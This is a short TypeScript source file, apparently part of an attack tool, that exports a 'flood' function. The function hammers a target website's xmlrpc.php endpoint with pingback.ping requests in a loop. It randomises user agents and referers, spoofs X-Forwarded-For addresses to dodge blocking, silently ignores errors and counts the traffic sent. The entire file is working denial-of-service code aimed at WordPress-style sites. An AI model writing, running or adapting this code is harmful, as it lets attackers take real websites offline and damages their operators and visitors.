import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randStr(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  let s = ""
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]
  return s
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  const target = `${u.origin.replace(/\/$/, "")}/xmlrpc.php`

  const body = `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>${randStr(64)}</string></value></param><param><value><string>${randStr(64)}</string></value></param></params></methodCall>`

  for (let i = 0; i < rpc; i++) {
    try {
      await fetch(target, {
        method: "POST",
        headers: {
          "User-Agent": randomChoice(USER_AGENTS),
          "Content-Type": "application/xml",
          "Content-Length": String(body.length),
          "X-Requested-With": "XMLHttpRequest",
          "Referer": randomChoice(REFERERS),
          "X-Forwarded-For": randIp(),
          "Connection": "keep-alive",
        },
        body,
        redirect: "manual",
      })
      onStats(1, body.length + 400)
    } catch {}
  }
}
